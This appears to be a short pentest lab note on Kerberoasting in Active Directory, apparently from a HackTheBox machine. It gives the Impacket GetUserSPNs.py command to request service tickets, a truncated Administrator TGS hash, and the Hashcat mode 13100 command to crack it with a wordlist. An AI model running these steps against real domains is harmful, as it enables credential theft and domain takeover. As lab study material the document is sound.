# Microsoft Windows AD Kerberos Tickets
We can use Impacket to gather a valid kerberos ticket with the following command,
```
root@attacker-machine:~# GetUserSPNs.py -request (HOST.DOMAIN)/(VALID SMB USER):(USER PASSWORD)
Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet      LastLogon           
--------------------  -------------  --------------------------------------------------------  -------------------  -------------------
host/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=host,DC=domain  2018-07-18 15:06:40  2018-07-30 13:17:40 



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$823

...(SNIPPED)...

root@attacker-machine:~#
```
## Cracking the Kerberos Ticket
We can use Hashcat to crack the kerberos ticket with the following arguments:
* `-a 0` - Straight cracking mode
* `-m 13100` - Hashtype 13100 - which is `Kerberos 5 TGS-REP etype 23 `
* the kerberos.ticket file
* `-w 3` - Suggested example "workload" setting for Hashcat

So, from the above output, we place the `$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$823`... string into a file and name it kerberos.ticket. Next, we call Hashcat using the arguments above, like so,
```
PS C:\Users\weaknet\Desktop\hashcat-5.1.0> .\hashcat64.exe -m 13100 -a 0 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\kerberos.tick
et' -w 3 'C:\Users\weaknet\Desktop\Portfolio\VMWare Shared\rockyou.txt'
hashcat (v5.1.0) starting...
```
This is shown in my host OS, since the VMware has no access to the GPU.
